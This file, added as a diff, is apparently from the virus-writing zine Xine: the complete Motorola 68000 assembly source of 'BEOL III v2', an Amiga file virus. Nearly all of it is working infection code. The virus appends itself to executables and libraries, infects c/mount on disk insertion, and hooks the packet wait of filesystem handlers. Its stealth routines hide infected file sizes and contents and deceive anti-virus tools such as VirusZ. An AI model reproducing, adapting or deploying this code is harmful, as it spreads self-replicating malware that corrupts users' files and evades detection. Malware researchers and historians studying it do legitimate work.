@@ -1,0 +1,864 @@
+
+                                        /-----------------------------\
+                                        | Xine - issue #2 - Phile 030 |
+                                        \-----------------------------/
+
+
+*****************************************************************************
+*				BEOL III v2				    *
+* Diff from v1: Stealth only enabled when file is _REALLY_ infected!	    *
+*									    *
+* Bugs: Libraryinfectioncode isn't reentrant => we could end up with fucked *
+*	up libs, if we infect 2 libraries at the same time!!!		    *
+*	Libraryinfection doesn't recognize libs with 2nd word != $4e75	    *
+*	There is no list arbitration, which could lead to missed read-calls.*
+*	Library infection can't handle libs with name&id-string in other    *
+*	hunks.								    *
+*****************************************************************************
+	incdir	hd1:dev/assembler/asm-one/include/
+	include	lvo3.0/exec_lib.i
+	include	lvo3.0/dos_lib.i
+	include	dos/dosextens.i
+	include	dos/doshunks.i
+	include	dos/dostags.i
+	include	exec/execbase.i
+	include	exec/memory.i
+	include	exec/resident.i
+	include	workbench/startup.i
+
+*********************************************
+* This hunk simulates an infected programm. *
+*********************************************
+	section	mindfuck,code
+Start:
+	movem.l	d0-a6,-(a7)
+	lea	OldProggy,a0
+	move.w	#SaveMemSize/4-1,d0
+.cl1	move.l	(a0)+,-(a7)
+	dbf	d0,.cl1
+	move.w	#OldProggySize-SaveMemSize-1,d0
+.cl2	move.b	(a0)+,-SaveMemSize-1(a0)
+	dbf	d0,.cl2
+	move.w	#SaveMemSize/4-1,d0
+.cl3	move.l	(a7)+,-(a0)
+	dbf	d0,.cl3
+	movem.l	(a7)+,d0-a6
+	jmp	Virus
+
+
+******************************************************************
+* This is the virus entry point!!!				 *
+******************************************************************
+	section	virus,code
+MagicNumber	equ	-23
+Virus:	pea	Virus(pc)
+	movem.l	d0-d7/a0-a6,-(a7)
+
+	move.l	4.w,a6		;Execbase
+	move.l	(ThisTask,a6),a0	;CurrentTask
+	move.l	(pr_CLI,a0),d0	;BPTR to CLI struct
+	beq.s	.wbench		;Programm called from workbench!
+	lsl.l	#2,d0		;BPTR => APTR
+	moveq	#cli_Module,d1
+	bra.s	.cli
+.wbench
+	add.w	#pr_MsgPort,a0	;Messageport
+	jsr	(_LVOWaitPort,a6)	;Wait for WBStartupMessage (d0=msg)
+	moveq	#sm_Segment,d1
+.cli	add.l	d1,d0
+	move.l	d0,a5
+
+	bsr.b	RestoreOldSeg
+	beq.b	.shit
+
+	move.l	d1,(a5)		;Cheat stupid AV-ware like VirusZ!!
+	addq.l	#4,d0		;Pointer to begin of code.
+	move.w	#$4ef9,(a0)+	;jmp $xxxxxxxx.l
+	move.l	d0,(a0)+	;Address (for resident proggys!)
+.shit	move.w	#$4e75,(a0)+
+
+Done:	lea	Virus(pc),a2
+	move.l	a2,d0
+	sub.l	d0,(rtMT-Virus,a2)	;Remove reloc information
+	sub.l	d0,(rtInit-Virus,a2)	;	-"-
+	move.w	#virlen/4-1,d7
+.cvl	move.l	(a2)+,(a3)+
+	dbf	d7,.cvl
+	move.l	a6,(a3)		;Save Dosbase after virus
+	move.l	4.w,a6
+	move.l	a4,a1
+	move.l	(a4),d0
+	jsr	(_LVOFreeMem,a6)
+	jsr	(_LVOCacheClearU,a6)
+	jmp	InfectTasks-end(a3)
+
+******************************************************
+* This is the entry point of Libraries, devices, ... *
+******************************************************
+
+Init:	movem.l	d0-a6,-(a7)
+	bsr.b	RestoreOldSeg
+	beq.b	.shit
+
+	move.l	a6,-(a7)
+	move.l	a0,d1
+	subq.l	#4,d1
+	lsr.l	#2,d1		;Seglist
+	move.l	d0,a1
+.fr	cmp.w	#$4afc,(a1)+	;Search original resident-struct
+	bne.b	.fr
+	subq.w	#2,a1
+	move.l	4.w,a6
+	jsr	(_LVOInitResident,a6)
+	move.l	(a7)+,a6
+	bra.b	.fin
+.shit:	moveq	#-1,d0
+.fin	move.l	d0,(a7)		;Result
+	bra.b	Done
+
+*************************************************************************
+* RestoreOldSeg: Restores the original data and uses InternalLoadSeg()	*
+*   to scatterload the proggy into mem					*
+* Output: d0.l=APTR to seglist						*
+*	  d1.l=BPTR to seglist						*
+*************************************************************************
+RestoreOldSeg:
+	move.l	4.w,a6
+
+	bsr.b	.DN
+	dc.b	'dos.library',0
+.DN:	move.l	(a7)+,a1
+	jsr	(_LVOOldOpenLibrary,a6)	;Open dos.library
+
+	move.l	(SysStkLower,a6),a3
+	move.l	Virus-4(pc),d1	;BPTR to nxt segment
+	lsl.l	#2,d1
+	move.l	d1,a4		;APTR to nxt segment
+	move.l	-(a4),d7	;Len of nxt segment+8
+	subq.l	#8,d7		;Len of segment
+	lea	(8,a4,d7.l),a1	;Ptr to end of code
+	move.w	#SaveMemSize/4-1,d6
+	move.w	d6,d5
+.cl1	move.l	-(a1),-(a7)	;Save header on stack
+	dbf	d6,.cl1
+	move.l	d7,d6
+	sub.l	(ReadEntry\.sms+2,pc),d6
+.cl2	move.b	-(a1),SaveMemSize(a1)	;Move mainpart
+	subq.l	#1,d6
+	bne.b	.cl2
+.cl3	move.l	(a7)+,(a1)+	;restore header.
+	dbf	d5,.cl3
+
+	sub.l	a0,a0		;Table (for overlay shit...)
+	pea	(_LVOFreeMem,a6)
+	pea	(_LVOAllocMem,a6)
+	pea	(MyRead,pc)
+	move.l	a7,a1		;FunctionArray
+	clr.l	-(a7)
+	move.l	a7,a2		;Pointer to ULONG???
+	pea	(8,a4)		;Actpos
+	pea	(8,a4,d7.l)	;End
+	move.l	d0,a6		;DosBase => a6
+	move.l	a7,d0		;fh
+	jsr	(_LVOInternalLoadSeg,a6)
+	lea	(6*4,a7),a7	;remove shit from stack...
+
+	lea	(Virus-4,pc),a0
+	move.l	d0,(a0)+
+	move.l	d0,d1
+	lsl.l	#2,d0
+	rts
+
+Resident:
+	dc.w	$4afc		;rt_MatchWord
+rtMT:	dc.l	Resident	;rt_MatchTag
+	dc.l	0		;rt_EndSkip
+	dc.b	0		;rt_Flags
+Ver:	dc.b	0		;rt_Version
+Type:	dc.b	0		;rt_Type
+	dc.b	0		;rt_Pri
+rtName:	dc.l	0		;rt_Name
+rtID:	dc.l	0		;rt_IdString
+rtInit:	dc.l	Init		;rt_Init
+
+***********************************************************************
+* ExamineEntry: This process decreases filelength in Examine-Packets, *
+*   if the file is infected					      *
+***********************************************************************
+ExamineEntry:
+	bsr.w	InitProc
+	moveq	#fib_Comment/4,d0
+	add.l	(a2),d0		;BPTR to Comment
+	lsl.l	#2,d0		;BPTR=>APTR
+	move.l	d0,a0
+
+	moveq	#0,d0
+	move.b	(a0),d0
+	beq.b	.notinf
+	tst.b	(a0,d0.w)
+	bne.b	.notinf
+.sms4	sub.l	#SaveMemSize+4,(fib_Size-fib_Comment,a0)
+.notinf	bra.b	ReadEntry\.xit
+*****************************************************************
+* ReadEntry: This process has to handle read-calls of infected  *
+*   files. The packet we get is the original read-packet	*
+*   First, we have to get fileposition and filelength then we	*
+*   cam simulate a read-call.					*
+*****************************************************************
+ReadEntry:
+	bsr.b	InitProc
+	movem.l	(a7),d0/d4/d5/d6/a4	;d0=ACTION_READ (dummy!)
+				;d4=Nr. of bytes read.
+				;d5=Secondarry error
+				;d6=fh_Args
+				;a4=Buffer
+
+	bsr.w	SeekEOF		;Go end!!
+	move.l	d0,d2		;Save Position
+	move.l	d2,d3
+	sub.l	d4,d3		;Begin of Read
+	bsr.w	SeekBeg		;Goto old postion
+	sub.l	(ExamineEntry\.sms4+2,pc),d0	;Len of original file
+	bmi.b	.shit		;<0 => Something wrong???
+	sub.l	d2,d0
+	bgt.b	.d2ok
+	moveq	#0,d5		;IoErr() should return EOF
+	add.l	d0,d2		;Correct end seek position
+	add.l	d0,d4		;Kill stuff he mustn't see.
+	bmi.b	.shit		;max read<0 => error
+.d2ok
+.sms	cmp.l	#SaveMemSize,d3	;Do we need to do stealth???
+	bge.b	.nostealth	;no :)))
+;Compute correct Fileposition
+	move.l	d3,d0
+	sub.l	(ExamineEntry\.sms4+2,pc),d0
+	bsr.w	SeekEnd
+	move.l	(.sms+2,pc),d0
+	sub.l	d3,d0		;Maximum ReadLength
+	cmp.l	d0,d4
+	bgt.b	.d4sux
+	move.l	d4,d0
+.d4sux	move.l	d0,(dp_Arg3-dp_Arg2,a2)
+	move.l	a4,(a2)
+	moveq	#ACTION_READ,d0
+	bsr.w	DoPktD6
+.nostealth
+	move.l	d2,d0
+	bsr.w	SeekBeg
+	bra.b	.ok
+.shit	moveq	#-1,d4		;Error
+.ok	movem.l	d4/d5,(4,a7)	;Result
+.xit	bra.w	ProcEntry\.endprocess3
+
+*********************************************************
+* InitProc: Does some initial stuff:			*
+*   Gets Execbase, CurrentTask, SPLower, MsgPort.	*
+*   Waits for the initial Packet.			*
+*   Saves Packet on stack.				*
+*********************************************************
+InitProc:
+	move.l	4.w,a6
+	move.l	(ThisTask,a6),a2	;Current Task=>a2
+	move.l	(TC_SPLOWER,a2),a5	;tc_SPLower, used for FIB (100% sure
+				;of being longword aligned!!!)
+	moveq	#pr_MsgPort,d7	;pr_MsgPort+Current Task
+	add.l	a2,d7		;=MsgPort of our process
+	bsr.w	WaitMsg
+	move.l	(a7)+,a0
+	lea	48-dp_Arg2(a2),a1
+	moveq	#10-1,d0
+.sp1	move.l	-(a1),-(a7)	;Save Packet
+	dbf	d0,.sp1
+	jmp	(a0)
+
+********************************************************************
+* ProcEntry: This is the process whose task is to infect the file. *
+*   at the begin it recieves a packet, which is the replypacket    *
+*   for the FIND_INPUT function for the file. Arg7 is set to	   *
+*   the original owner of the packet.				   *
+*   TO FIX: This isn't (but should be) 100% reentrant.		   *
+* Input: d0-d7/a0-a6:Bullshit					   *
+* Output: nobody cares,because a process has it's own set of regs  *
+********************************************************************
+ProcEntry:
+	bsr.b	InitProc
+;We got the message from the handler. This message is the OPENPacket
+;we have stolen from the handler.
+	lea	dp_Arg1-dp_Arg2(a2),a1
+	sub.l	a0,a0
+	move.l	(a1)+,d0	;BPTR to filehandle
+	lsl.l	#2,d0		;BPTR=>APTR
+	move.l	36(a0,d0.l),d6	;fh_Args=>d6 (This must be passed to
+				;several functions (close,read,...))
+
+	move.l	(a1)+,a4	;Save parentlock
+	move.l	(a1)+,d5	;BPTR to filename
+	move.l	d5,d0
+	lsl.l	#2,d0		;d0=APTR to filename (still a BSTR!)
+	cmp.l	#$092e6261,(a0,d0.l) ;begin of BSTR(".backdrop") ???
+	bne.b	.NoBack
+;someone wants to read a .backdrop file. in most cases, this means,
+;that someone inserted a disk into a drive, or that the wb has been
+;started. we use this to infect the c:mount command of the new disk!
+	movem.l	d0-d3/a0-a2/a6,-(a7)
+	move.l	DosBase(pc),a6
+	move.l	a4,d1		;lock
+	jsr	(_LVODupLock,a6)	;duplock
+	move.l	d0,d1		;or is it allready in d1???
+	beq.b	.fub
+	jsr	(_LVOCurrentDir,a6)	;current dir
+	jsr	(_LVOUnLock,a6)	;Unlock oldlock
+	bsr.b	.lwb
+	dc.b	'c/mount',0
+.lwb	move.l	(a7)+,d1	;APTR to "c/mount"
+	move.l	dp_Type-dp_Arg2(a2),d2	;MODE_OLDFILE
+	jsr	(_LVOOpen,a6)	;Open file (and infect it!!)
+	jsr	(_LVOClose,a6)	;Close file
+.fub	movem.l	(a7)+,d0-d3/a0-a2/a6
+
+.NoBack	tst.l	dp_Res1-dp_Arg2(a2)	;OK??? (0=DOSFALSE -1=DOSTRUE)
+	beq.w	.nofh
+
+	move.l	a5,d0		;fib=>d0
+	lsr.l	#2,d0		;APTR 2 BPTR
+	move.l	d0,(a2)		;arg2=BPTR(fib)
+
+	move.l	a4,dp_Arg1-dp_Arg2(a2)	;arg1=parentlock
+	moveq	#ACTION_INFO,d0
+	bsr.w	DoPkt
+	bpl.b	.bplerr3
+
+	lea	16(a5),a5
+	move.l	(a5),d0		;NumUsedBlocks (a5=Info+16)
+	sub.l	-(a5),d0	;-NumBlocks    (a5=Info+12)
+	addq.l	#8,d0		;Are there more than 8 blocks left??
+	bpl.b	.bplerr3	;No=>exit
+
+	move.w	#ACTION_EXAMINE_FH,d0
+	bsr.w	DoPktD6
+.bplerr3
+	bpl.w	.err3
+
+	move.l	fib_Size-12(a5),d4	;save old size
+	pea	(fib_Comment-12,a5)	;save pointer to comment
+	move.l	(fib_Protection-12,a5),-(a7)	;save protectionflags
+
+	moveq	#4,d0
+	move.l	d0,dp_Arg3-dp_Arg2(a2)	;Arg3=Length of Buffer
+	subq.l	#4,a7		;Make space
+	move.l	a7,(a2)		;Arg2=Mem
+	moveq	#ACTION_READ,d0
+	bsr.w	DoPktD6
+.hh	cmp.l	#HUNK_HEADER,(a7)+	;HUNK_HEADER??
+	bne.w	.noexe
+
+	bsr.w	SeekStart		;Go back!!
+
+	move.l	(ExamineEntry\.sms4+2,pc),d0	;size of buffer we need
+	move.l	d0,d3
+	moveq	#MEMF_PUBLIC,d1
+	jsr	(_LVOAllocVec,a6)
+	move.l	d0,a5
+	move.l	d0,(a2)		;buffer
+	beq.w	.noexe		;error=>exit
+
+	move.l	d3,dp_Arg3-dp_Arg2(a2)
+	moveq	#ACTION_READ,d0
+	bsr.w	DoPktD6		;read it.
+	cmp.l	d0,d3		;Have we read all?
+	bne.b	.bneerr4	;no=>error
+
+.name	cmp.l	#'BEOL',(.name+2-Virus+9*4,a5)
+				;Loox like file from us?
+	bne.b	.nobeol
+	bsr.w	SeekStart	;go to beginning of file!
+	bsr.w	MarkFile	;Set mark, etc.
+
+;File is infected=> we add it to the list of infected FHs
+	lea	(InfList,pc),a0
+	addq.l	#4,(a0)		;Not reentrant!!!!!
+	add.l	(a0),a0
+	move.l	d6,(a0)
+.endprocess3
+	clr.l	(dp_Arg6-8,a7)	;Clear Mark bcoz we don't want to miss pkts
+	move.l	dp_Port-dp_Arg2(a2),d7
+				;MsgPort of Handler
+	move.l	dp_Arg7-dp_Arg2(a2),dp_Port-dp_Arg2(a2)
+				;MsgPort of the legal Packetowner
+	bra.w	.endprocess2
+.nobeol
+	move.l	#HUNK_END,-4(a5,d3.w)
+;-------- check if file is ok.
+	move.l	d3,d0
+	lsr.l	#1,d0
+	move.l	a5,a0
+	move.l	a5,d1
+.sc	cmp.w	#HUNK_CODE,(a0)+
+	dbeq	d0,.sc
+	bne.b	.bneerr4
+	sub.l	a0,d1		;d1=-distance from begin of file to 1st hunk
+	addq.w	#4,a0
+	beq.w	.err4
+	addq.w	#2,a0
+	cmp.w	#$4e75,(a0)+	;$4e75 => library or stuff like that.
+	bne.b	.isok
+;-------- library, device,... ??? => search for resident struct!
+.sc2	cmp.w	#$4afc,(a0)+
+	dbeq	d0,.sc2
+.bneerr4
+	bne.w	.err4
+	move.l	#SaveMemSize-80,d0
+	cmp.l	(RT_NAME-2,a0),d0
+	blt.b	.bneerr4
+	cmp.l	(RT_IDSTRING-2,a0),d0
+	blt.b	.bneerr4
+
+	lea	Ver(pc),a1
+	add.w	#RT_VERSION-2,a0
+	move.b	(a0)+,(a1)+		;Version
+	move.w	(a0)+,(a1)+		;Type & Priority
+	move.l	d4,d0			;original len
+	sub.l	d1,d0			;+offset to 1st hunk
+	sub.l	#SaveMemSize-4,d0	;-SaveMemSize
+	move.l	(a0)+,(a1)		;Name
+	add.l	d0,(a1)+
+	move.l	(a0)+,(a1)		;Idstring
+	add.l	d0,(a1)+
+.isok
+	lsr.l	#2,d4		;len in longwords
+	bcs.b	.bneerr4	;only want filelengths mod 4 =0!!
+
+	bsr.w	SeekEOF		;Go end!!
+
+	moveq	#0,d1		;----rwed
+	bsr.w	Protect		;so we can write it...
+
+	move.l	a2,a1
+	move.l	a5,(a1)+	;ptr to buffer
+	move.l	d3,(a1)+	;no. of bytes to write
+	moveq	#ACTION_WRITE,d0
+	bsr.w	DoPktD6		;write it.
+
+	bsr.w	SeekStart	;Go beginning
+
+	move.l	a5,a0
+	addq.l	#8,a0		;1st 8 bytes allready initialised
+	moveq	#2,d0
+	move.l	d0,(a0)+	;2 hunks
+	clr.l	(a0)+		;Number of first hunk=0
+	moveq	#1,d1
+	move.l	d1,(a0)+	;Number of last hunk=1
+	move.w	#virlen/4,d0
+	move.l	d0,(a0)+	;Len of first hunk
+	move.l	d4,(a0)+	;Len of 2nd hunk
+	move.w	#HUNK_CODE,d1
+	move.l	d1,(a0)+
+	move.l	d0,(a0)+
+	move.l	#$487afffe,(a0)+	;pea *-2(pc)
+	move.l	MMOC(pc),(a0)+		;movem.l d0-a6,-(a7)
+
+	lea	(Virus+8,pc),a1
+	move.w	#(virlen-8)/4-1,d0
+.cvl2	move.l	(a1)+,(a0)+	;CopyVir
+	dbf	d0,.cvl2
+
+	addq.l	#3,d1		;HUNK_RELOC32
+	move.l	d1,(a0)+
+	moveq	#2,d0
+	move.l	d0,(a0)+	;2 Relocs
+	clr.l	(a0)+		;From Hunk0
+	lea	(rtMT-Virus).w,a1
+	move.l	a1,(a0)+	;reloc nr.1
+	add.w	#rtInit-rtMT,a1
+	move.l	a1,(a0)+	;reloc nr.2
+	move.l	d0,(a0)+	;2 Relocs
+	moveq	#1,d0
+	move.l	d0,(a0)+	;From Hunk1
+	subq.l	#rtInit-rtName,a1
+	move.l	a1,(a0)+	;reloc nr.1
+	addq.l	#rtID-rtName,a1
+	move.l	a1,(a0)+	;reloc nr.2
+	clr.l	(a0)+		;No more relocs
+	addq.l	#HUNK_END-HUNK_RELOC32,d1	;HUNK_END
+	move.l	d1,(a0)+
+	subq.l	#HUNK_END-HUNK_DATA,d1		;HUNK_DATA
+	move.l	d1,(a0)+
+	move.l	d4,(a0)+
+
+	move.l	a2,a1
+	move.l	a5,(a1)+	;ptr to buffer
+	subq.l	#4,d3
+	move.l	d3,(a1)+	;no. of bytes to write
+	moveq	#ACTION_WRITE,d0
+	bsr.w	DoPktD6		;write it.
+
+;------------------------------------------------------------------
+	bsr.b	Close
+	bsr.b	MarkFile
+	bra.b	.nofh
+.err4
+	move.l	a5,a1		;Buffer
+	jsr	(_LVOFreeVec,a6)	;Free it!!
+.noexe
+	addq.w	#8,a7		;remove shit from stack
+.err3
+	bsr.b	Close
+.nofh
+	move.l	dp_Arg7-dp_Arg2(a2),d7	;MsgPort of the legal Packetowner
+.endprocess2
+	lea	dp_Type-dp_Arg2(a2),a0
+	moveq	#10-1,d0
+.rp	move.l	(a7)+,(a0)+	;Restore Packet
+	dbf	d0,.rp
+;FALL THRU to PutPkt!!!
+PutPkt:
+	move.l	dp_Port-dp_Arg2(a2),a0	;This is the MSGPort of the handler.
+	move.l	d7,dp_Port-dp_Arg2(a2)
+	move.l	d7,14(a3)
+	move.l	a3,a1		;MSG=>a1
+	jmp	(_LVOPutMsg,a6)	;Send it!!
+
+;Exit From Process
+
+
+;remember: all the following subroutines expect A6 to contain the
+;  execbase address!!!
+*************************************************************************
+* MarkFile: Frees Buffer resets protection flags & filedate. And marks	*
+*   file as infected							*
+*************************************************************************
+MarkFile:
+	move.l	a5,a1		;Buffer
+	jsr	(_LVOFreeVec,a6)	;Free it!!
+
+	movem.l	(a7)+,d0/d1/d2	;d0=Returnaddress d1=ProtectionFlags
+				;d2=Ptr to comment
+	move.l	d0,-(a7)	;Push return address
+	move.l	d2,a0		;Comment
+	move.l	d2,a1
+
+	moveq	#0,d0
+	move.b	(a0),d0
+	beq.b	.mark
+	add.w	d0,a1
+	tst.b	(a1)+
+	beq.s	.ninf
+.mark	clr.b	(a1)+		;Make sure, that next char in comment is 0!
+	clr.b	(a1)+		;Special case len=0
+	addq.b	#1,(a0)		;Mark file!
+.ninf
+	bsr.b	Protect		;restore protectionflags
+
+	lsr.l	#2,d2		;dp_Arg4=BPTR to Comment
+	moveq	#ACTION_SET_COMMENT,d0
+	bsr.b	.pktd2
+
+	clr.l	(dp_Arg6-8+4,a7);Clear Mark in order to activate stealth!!
+
+	subq.l	#(fib_Comment-fib_DateStamp)/4,d2
+	lsl.l	#2,d2		;dp_arg4=APTR to datestamp
+	moveq	#ACTION_SET_DATE,d0
+.pktd2
+	move.l	d2,(dp_Arg4-dp_Arg2,a2)
+	bra.b	DoPkt
+**********************
+* Close: Closes File *
+**********************
+Close:
+	move.w	#ACTION_END,d0
+	bra.b	DoPktD6
+
+*************************************************
+* Protect: sets the protection flag of the file *
+* Input: d1=protectionflags			*
+*	 a2=Packet				*
+*	 a3=ExecMessage of Packet d7=OurMsgPort	*
+*	 d5=BPTR to filename			*
+* Destroyed: d0/d1/a0/a1			*
+*************************************************
+Protect:
+	lea	dp_Arg5-dp_Arg2(a2),a0
+	move.l	d1,-(a0)	;fh_arg4=Protectionflags
+	move.l	d5,-(a0)	;fh_arg3=filename
+	move.l	a4,-(a0)	;fh_arg2=parentlock
+	clr.l	-(a0)		;no idea what this lword means...
+	moveq	#ACTION_SET_PROTECT,d0
+	bra.b	DoPkt
+*************************************************
+* SeekEOF: Go to end of file			*
+* SeekEnd: Seek relative to end of file		*
+* SeekStart: Go to beginning of file		*
+* SeekBeg: Seek relative to beginning of file	*
+* Seek: Sends a ACTION_SEEK pkt			*
+* Input: d0.l=Arg2				*
+*	 d1.l=Arg3				*
+*************************************************
+SeekEOF:
+	moveq	#0,d0
+SeekEnd:
+	moveq	#OFFSET_END,d1
+	bra.b	Seek
+SeekStart:
+	moveq	#0,d0
+SeekBeg:
+	moveq	#OFFSET_BEGINNING,d1
+Seek:
+	movem.l	d0/d1,(a2)
+	move.w	#ACTION_SEEK,d0
+**************************************************************
+* DoPktD6: Same as DoPkt, but puts d6 in Arg1 of Packet      *
+**************************************************************
+DoPktD6:
+	move.l	d6,dp_Arg1-dp_Arg2(a2)
+
+;Remark: fall thru to DoPkt!!
+**************************************************************
+* DoPkt: Sends a Packet to handler and waits for it's return *
+*	 this function is reentrant.			     *
+* ReDoPkt: like DoPkt, but doesn't set packettype.	     *
+* Input: d0=Type of packet				     *
+*	 a3=ExecMessage of Packet d7=Our MsgPort	     *
+* Output: d0:12(a2) (=res1)				     *
+*         CCs set depending on d0			     *
+* Destroyed: d0/d1/a0/a1				     *
+**************************************************************
+DoPkt:
+	move.w	d0,dp_Type+2-dp_Arg2(a2)
+ReDoPkt:
+	bsr.b	PutPkt
+;FALL THRU to WaitMsg
+
+*********************************************************
+* WaitMsg: Waits for a message to appear at our port.	*
+*          this function is reentrant.			*
+* Input: d7:MsgPort a6:Execbase				*
+* Output: d0:12(a2) (=res1)				*
+*         CCs set depending on d0			*
+*	  a2:DosPacket+dp_Arg2				*
+*	  a3:Message					*
+* Destroyed: d0/d1/a0/a1				*
+*********************************************************
+WaitMsg:
+	move.l	d7,a0		;MsgPort
+	jsr	(_LVOWaitPort,a6)	;WaitPort
+	move.l	d7,a0		;MsgPort
+	jsr	(_LVOGetMsg,a6)	;GetMsg
+	move.l	d0,a3		;MSG=>a3
+	move.l	10(a3),a2	;DosPacket=>a2
+	lea	dp_Arg2(a2),a2
+	move.l	dp_Res1-dp_Arg2(a2),d0
+	rts
+
+***************************************************************************
+* Here's the list of the archivers, where we disable infection & stealth. *
+* Each packer is represented by a longword. The 1st byte is the	len of	  *
+* the name. The others are the first 3 bytes.				  *
+* They have to be orderd by value of the Longword.			  *
+***************************************************************************
+Packers:
+	dc.l	$dfdfdfdf	;Uppercase
+	dc.b	03,'L','H','A'	;LHA
+	dc.b	03,'L','Z','X'	;LZX
+	dc.b	03,'Z','I','P'	;ZIP
+	dc.b	05,'L','H','A'	;LHARC
+***********************************************************
+* IsInList: checks if file is in list of infected files.  *
+* Input: a5=Pointer to packet+8				  *
+* Output: d2=Offset to last item			  *
+*	  a0=Pointer to item				  *
+*	  a1=Pointer to list				  *
+*         Z-Flag: 1 if file is in list			  *
+***********************************************************
+IsInList:
+	move.l	dp_Arg1-8(a5),d1	;get fh
+	lea	(InfList,pc),a0
+	move.l	a0,a1
+	move.l	(a0)+,d2	;number of list entries
+.filel	subq.l	#4,d2
+	bmi.b	.rts
+	cmp.l	(a0)+,d1	;check nxt file
+	bne.b	.filel
+.rts	rts
+
+********************************************************************
+* NewWP: This is the WaitPkt() replacement for the Handlers.	   *
+*  BUG: the list code isn't reentrant.				   *
+* Input: ???? (I have no documentation, but i think its just	   *
+*  bullshit)							   *
+* Output: d0.l=ptr to Message (not to packet!)			   *
+********************************************************************
+MMOC:
+NewWP:	movem.l	d0-d7/a0-a6,-(a7)
+	move.l	4.w,a6
+	moveq	#pr_MsgPort,d7
+	add.l	ThisTask(a6),d7	;Compute ptr to msgport
+	bsr.b	WaitMsg		;Get packet
+
+	move.l	10(a3),a5	;Address of Packet
+	addq.l	#4,a5
+
+	clr.l	-(a7)		;TAG_DONE
+
+	moveq	#MagicNumber,d0
+	cmp.l	dp_Arg6-4(a5),d0	;Marked Packet???
+	beq.b	.goshitpkt2	;Yup=>exit
+
+;Check, if calling programm is lha,lzx or zip. If yes, disable infection
+;because this causes illegal archives (they examine first). Disable
+;stealth, because we want the virus in the archive!
+	sub.l	a1,a1		;clear a1
+	move.l	(a5)+,d1	;Ptr to MsgPort of Packetowner.
+	beq.b	.goshitpkt2	;In my tests i got pkts with dp_Port==0 !?
+	cmp.b	#NT_PROCESS,(LN_TYPE-pr_MsgPort,a1,d1.l)	;Process??
+	bne.b	.nopack
+	move.l	(pr_CLI-pr_MsgPort,a1,d1.l),d2	;Cli structure
+	beq.b	.nopack
+	lsl.l	#2,d2		;BPTR=>APTR
+	move.l	(cli_CommandName,a1,d2.l),d3
+	beq.b	.nopack
+	lsl.l	#2,d3		;BPTR=>APTR
+	move.l	(a1,d3.l),d4	;4 bytes of BSTR
+	lea	(Packers,pc),a0
+	and.l	(a0)+,d4	;Make uppercase
+.chkpak	cmp.l	(a0)+,d4
+	beq.b	.goshitpkt2	;If packer, exit!
+	bgt.b	.chkpak		;If > then continue
+.nopack
+
+;Check if packet is interesting...
+	move.l	(a5),d1
+	sub.w	#ACTION_EXAMINE_OBJECT,d1
+	beq.b	.expkt
+	subq.w	#ACTION_EXAMINE_NEXT-ACTION_EXAMINE_OBJECT,d1
+	beq.b	.expkt
+	sub.w	#ACTION_READ-ACTION_EXAMINE_NEXT,d1
+	beq.b	.readpkt
+
+	sub.w	#ACTION_FINDINPUT-ACTION_READ,d1
+	beq.b	.openpkt
+
+	subq.w	#ACTION_END-ACTION_FINDINPUT,d1
+	beq.b	.endpkt
+
+	subq.w	#ACTION_SEEK-ACTION_END,d1
+	beq.b	.seekpkt
+
+	sub.w	#ACTION_EXAMINE_FH-ACTION_END,d1
+	bne.b	.shitpkt2
+.expkt
+	pea	ExamineEntry(pc)
+	bra.b	.pktcont
+;ACTION_END: if we have this one in our list, we delete it from there
+.endpkt	bsr.w	IsInList
+	bne.b	.shitpkt2
+	move.l	(a0,d2.l),(a0)		;Overwrite with last listitem
+	subq.l	#4,(a1)			;decrease list-length
+.goshitpkt2
+	bra.b	.shitpkt2
+.readpkt
+	bsr.w	IsInList
+	bne.b	.shitpkt2
+	pea	ReadEntry(pc)
+	bra.b	.pktcont
+.seekpkt
+	bsr.w	IsInList
+	bne.b	.shitpkt2
+	tst.l	(dp_Arg3-8,a5)		;OFFSET_END??
+	ble.b	.shitpkt2
+	move.l	(ExamineEntry\.sms4+2,pc),d0
+	sub.l	d0,(dp_Arg2-8,a5)
+	bra.b	.shitpkt2
+.openpkt
+	pea	ProcEntry(pc)
+.pktcont
+	move.l	d0,dp_Arg6-8(a5)	;Mark Packet
+
+	pea	(NP_Entry).l
+	move.l	a7,d1
+
+	move.l	(DosBase,pc),a6
+	jsr	(_LVOCreateNewProc,a6)	;CreateNewProc
+	move.l	4.w,a6
+	tst.l	d0			;OK??
+	beq.b	.shitpkt		;No=>Badluck
+
+	moveq	#pr_MsgPort,d1
+	add.l	d1,d0			;Ptr to msgport of newproc
+
+	move.l	-(a5),dp_Arg7-4(a5)	;Save old ReplyPort
+	move.l	d0,(a5)			;dp_Port
+	move.l	d0,14(a3)		;mn_ReplyPort
+
+.shitpkt
+	addq.w	#8,a7
+.shitpkt2
+	addq.w	#4,a7
+	move.l	a3,(a7)		;return msg in d0
+;FALL THRU to InfectTasks!!!
+*****************************************************************
+* InfectTasks: The cool BEOL task infection stuff. Check this	*
+*   out!							*
+* Input: a6:execbase						*
+*	 stack: d0-a6 (will be restored!)			*
+* Output: nothing						*
+*****************************************************************
+InfectTasks:
+	jsr	(_LVOForbid,a6)
+	sub.l	a5,a5		;clear a5
+	move.l	DosBase(pc),a4	;dosbase=>a4
+	move.l	34(a4),a4	;RootNode
+	move.l	dp_Arg2(a4),d1	;DosInfo
+	lsl.l	#2,d1		;BPTR=>APTR
+	move.l	4(a5,d1.l),d1	;DevInfo
+	bra.b	.dle
+.dl	movem.l	(a5,d1.l),d1/d2/a1	;d1=BPTR to next DevInfo
+				;d2=type
+				;a1=ptr to msgport of handler
+	subq.l	#2,d2		;Type==DLT_VOLUME???
+	bne.b	.dle		;No=>get nxt
+;Infect the task:
+	pea	NewWP(pc)	;Our own code.
+	move.l	(a7)+,(pr_PktWait-pr_MsgPort,a1)
+				;store it in pr_PktWait
+.dle	lsl.l	#2,d1		;BPTR=>APTR
+	bne.b	.dl
+	jsr	(_LVOPermit,a6)	;Permit
+Quit:	movem.l	(a7)+,d0-d7/a0-a6
+	rts
+
+*********************************************************
+* Replacement for DOS-Read().				*
+* Input:						*
+*	d1.l=Ptr to file				*
+*	d2.l=Ptr to Buffer				*
+*	d3.l=Len					*
+* Output:						*
+*	d0.l=Number of bytes read			*
+*********************************************************
+MyRead:
+	move.l	d1,a1
+	move.l	(a1)+,d0	;End
+	sub.l	(a1),d0		;-actpos = Max. Read.
+	cmp.l	d0,d3
+	bge.b	.d0ok
+	move.l	d3,d0
+.d0ok	move.l	d0,d1
+	move.l	(a1),a0
+	add.l	d0,(a1)
+	move.l	d2,a1
+	bra.b	.cle
+.cl	move.b	(a0)+,(a1)+
+.cle	dbf	d1,.cl
+	rts
+
